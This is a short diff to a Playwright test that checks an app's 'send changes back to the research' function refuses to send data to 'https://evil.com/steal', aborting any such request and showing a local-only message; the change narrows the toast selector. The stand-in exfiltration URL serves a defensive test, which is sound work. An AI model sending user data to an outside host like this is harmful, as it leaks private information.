@@ -173,7 +173,8 @@ test.describe('send changes back to the research', () => {
         let requested = false;
         await page.route('**/evil.com/**', (route) => { requested = true; return route.abort(); });
         await page.evaluate(() => window.Strom.UI.sendChangesToResearch('https://evil.com/steal'));
-        await expect(page.locator('.toast')).toContainText('on this computer');
+        // The message (the refused send's toast stands beside it until this one takes its place).
+        await expect(page.locator('.toast:not(.toast--progress)')).toContainText('on this computer');
         expect(requested).toBe(false);
     });
 
